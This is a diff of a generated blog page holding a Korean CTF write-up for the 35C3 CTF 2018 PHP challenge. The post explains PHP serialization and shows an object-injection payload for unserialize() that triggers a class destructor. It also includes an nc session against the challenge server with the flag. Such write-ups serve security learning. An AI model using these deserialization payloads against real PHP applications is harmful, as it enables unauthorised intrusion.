@@ -16,10 +16,9 @@
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
 
     
-    <link rel="stylesheet" href="/sass/main.min.8ca5191b462e3d74a37471fc57f4db16bfc0e0793671b203652f413c2eada44c.css">
+    <link rel="stylesheet" href="/sass/main.min.26eb1acd477bb104720ba3121a7b7ad8a79d6dddd17e8f9ad34755abcb48ecf2.css">
 
     <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
-
 
     <link rel="stylesheet" type="text/css"
         href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -27,7 +26,6 @@
 
     <script src="https://code.jquery.com/jquery-1.12.4.min.js"
         integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
-
 
     
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130304424-1"></script>
@@ -181,15 +179,24 @@
             2018-12-30
         </p>
     </header>
-    <section class="post-content"><p>어제 ctftime을 돌아보다가 <code>35C3 CTF</code>가 하고 있길래 한 문제를 풀어보았다.</p>
-<p>원래 몇개 더 풀어보고 싶었는데 어떻게 푸는건지를 모르겠다.</p>
-<p>아직 Write up이 안올라왔던데, 나중에 올라오면 찾아봐야겠다.</p>
+    <section class="post-content"><p>어제 ctftime을 돌아보다가 <code>35C3 CTF</code>가 하고 있길래 한 문제를 풀어보았다.
+원래 몇개 더 풀어보고 싶었는데 어떻게 푸는건지를 모르겠다.
+아직 Write up이 안올라왔던데, 나중에 올라오면 찾아봐야겠다.</p>
 <p>일단 <code>php</code> 문제 정보는 다음과 같다.</p>
-<pre><code>PHP's unserialization mechanism can be exceptional. Guest challenge by jvoisin.
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">PHP&#39;s unserialization mechanism can be exceptional. Guest challenge by jvoisin.
 
 Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar. Challenge running at: nc 35.242.207.13 1
-</code></pre><p>파일을 다운받아 압축을 풀어보면 <code>php.php</code> 파일을 확인할 수 있다.</p>
-<p><code>php.php</code>의 내용은 다음과 같다.</p>
+</code></pre></td></tr></table>
+</div>
+</div><p>파일을 다운받아 압축을 풀어보면 <code>php.php</code> 파일을 확인할 수 있다.
+<code>php.php</code>의 내용은 다음과 같다.</p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -232,31 +239,23 @@ Files at https://35c3ctf.ccc.ac/uploads/php-ff2d1f97076ff25c5d0858616c26fac7.tar
 <span style="color:#ff79c6">echo</span> <span style="color:#8be9fd;font-style:italic">$a</span>;
 </code></pre></td></tr></table>
 </div>
-</div><p><code>STDIN</code>으로 입력 값을 받아 <code>$line</code>에 저장한 후, 이를 <code>unserialize</code> 함수를 통해 <code>unserialize</code> 한 값을 <code>$a</code>에 저장한다.</p>
-<p>마지막으로 <code>$a</code>를 출력 해 준다.</p>
-<p>그런데 위를 살펴보면 <code>B</code>라는 <code>class</code>가 선언되어 있고, <code>__destruct</code> 함수 안에 <code>$flag</code>함수를 출력 해 준다.</p>
-<p>아무래도 <code>unserialize</code> 함수의 취약점(?)을 가지고 푸는 문제인 것 같아 일단 <code>unserialize</code>함수가 무엇인지를 찾아보았다.</p>
-<blockquote>
-<p>serialize()</p>
-<blockquote>
-<p>PHP 변수들을 string으로 만들어 주는 함수<br>
-ex) serialize(array(3, 4, 5, 6)) =&gt; a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}<br>
-a:4 =&gt; 배열의 크기는 4<br>
-object 일 경우 O:object_name_length:&ldquo;object_name&rdquo;:object_size:<br>
-ex) O:8:&ldquo;stdclass&rdquo;:8:<br>
-i:0;i:3 =&gt; 배열 첫 번째 인덱스의 값은 3<br>
-int가 아닌 string 형태 일 경우 s:string_length:&ldquo;string&rdquo;; <br>
-ex) s:3:&ldquo;one&rdquo;;</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>unserialize()</p>
-<blockquote>
-<p>serialize 된 변수를 PHP 값으로 변환<br>
-ex) unserialize(a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}) =&gt; Array([0] =&gt; 3 [1] =&gt; 4 [2] =&gt; 5 [3] =&gt; 6)</p>
-</blockquote>
-</blockquote>
-<p>그런데 찾아보다 보니, 아래와 같은 블로그를 찾을 수 있었다.</p>
+</div><p><code>STDIN</code>으로 입력 값을 받아 <code>$line</code>에 저장한 후, 이를 <code>unserialize</code> 함수를 통해 <code>unserialize</code> 한 값을 <code>$a</code>에 저장한다.
+마지막으로 <code>$a</code>를 출력 해 준다.
+그런데 위를 살펴보면 <code>B</code>라는 <code>class</code>가 선언되어 있고, <code>__destruct</code> 함수 안에 <code>$flag</code>함수를 출력 해 준다.
+아무래도 <code>unserialize</code> 함수의 취약점(?)을 가지고 푸는 문제인 것 같아 일단 <code>unserialize</code>함수가 무엇인지를 찾아보았다.</p>
+<h3 id="serialize">serialize()</h3>
+<pre><code>PHP 변수들을 string으로 만들어 주는 함수  
+ex) serialize(array(3, 4, 5, 6)) =&gt; a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}  
+a:4 =&gt; 배열의 크기는 4  
+object 일 경우 O:object_name_length:&quot;object_name&quot;:object_size:  
+ex) O:8:&quot;stdclass&quot;:8:  
+i:0;i:3 =&gt; 배열 첫 번째 인덱스의 값은 3  
+int가 아닌 string 형태 일 경우 s:string_length:&quot;string&quot;;    
+ex) s:3:&quot;one&quot;;
+</code></pre><h3 id="unserialize">unserialize()</h3>
+<pre><code>serialize 된 변수를 PHP 값으로 변환  
+ex) unserialize(a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}) =&gt; Array([0] =&gt; 3 [1] =&gt; 4 [2] =&gt; 5 [3] =&gt; 6)  
+</code></pre><p>그런데 찾아보다 보니, 아래와 같은 블로그를 찾을 수 있었다.</p>
 <blockquote>
 <p><a href="http://qkqhxla1.tistory.com/444">http://qkqhxla1.tistory.com/444</a></p>
 </blockquote>
@@ -266,26 +265,53 @@ ex) unserialize(a:4:{i:0;i:3;i:1;i:4;i:2;i:5;i:3;i:6;}) =&gt; Array([0] =&gt; 3 
 <li>공격중의 모든 클래스들은 취약한 unserialize()가 호출되기 전에 선언되어야 한다.</li>
 </ol>
 <p>그래서 아래와 같이 입력 해 보았다.</p>
-<pre><code>O:1:&quot;B&quot;:1{s:4:&quot;flag&quot;;s:5:&quot;/flag&quot;;}
-</code></pre><p>그러면 <code>B</code> 클래스에 <code>flag</code>라는 이름으로 <code>/flag</code>를 할당하고 <code>__destruct</code> 메소드를 호출하며 <code>echo $flag</code>를 실행 할 것이다.</p>
-<p>문제에 접속하여 위와 같이 입력 했더니 flag를 읽을 수 있었다!</p>
-<pre><code>$ nc 35.242.207.13 1
-O:1:&quot;B&quot;:1{s:4:&quot;flag&quot;;s:5:&quot;/flag&quot;;}
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">O:1:&#34;B&#34;:1{s:4:&#34;flag&#34;;s:5:&#34;/flag&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>그러면 <code>B</code> 클래스에 <code>flag</code>라는 이름으로 <code>/flag</code>를 할당하고 <code>__destruct</code> 메소드를 호출하며 <code>echo $flag</code>를 실행 할 것이다.
+문제에 접속하여 위와 같이 입력 했더니 flag를 읽을 수 있었다!</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc 35.242.207.13 1
+O:1:<span style="color:#f1fa8c">&#34;B&#34;</span>:1<span style="color:#ff79c6">{</span>s:4:<span style="color:#f1fa8c">&#34;flag&#34;</span>;s:5:<span style="color:#f1fa8c">&#34;/flag&#34;</span>;<span style="color:#ff79c6">}</span>
 35C3_php_is_fun_php_is_fun
 PHP Fatal error:  Uncaught Exception: Well that was unexpected… in /home/user/php.php:16
 Stack trace:
-#0 {main}
+<span style="color:#6272a4">#0 {main}</span>
   thrown in /home/user/php.php on line 16
-</code></pre><p>그런데 이 문제 다시 생각 해 보니 어찌됬든 <code>__destruct</code> 메소드만 호출하도록 하면 되서 굳이 내가 한 방식 말고 <code>O:1:&quot;B&quot;:1:{}</code> 이런식으로 해도 문제가 풀릴 것 같다.</p>
-<p>근데 뭐 풀었으니 됬다 ㅎㅎㅎ</p>
-<pre><code>35C3_php_is_fun_php_is_fun
-</code></pre></section>
+</code></pre></td></tr></table>
+</div>
+</div><p>그런데 이 문제 다시 생각 해 보니 어찌됬든 <code>__destruct</code> 메소드만 호출하도록 하면 되서 굳이 내가 한 방식 말고 <code>O:1:&quot;B&quot;:1:{}</code> 이런식으로 해도 문제가 풀릴 것 같다.
+근데 뭐 풀었으니 됬다 ㅎㅎㅎ</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">35C3_php_is_fun_php_is_fun
+</code></pre></td></tr></table>
+</div>
+</div></section>
     <footer>
     <div class="tags">
         
-        <a href="/tags#CTF">#CTF</a>
-        
         <a href="/tags#Write-up">#Write-up</a>
+        
+        <a href="/tags#CTF">#CTF</a>
         
         <a href="/tags#35C3CTF2018">#35C3CTF2018</a>
         
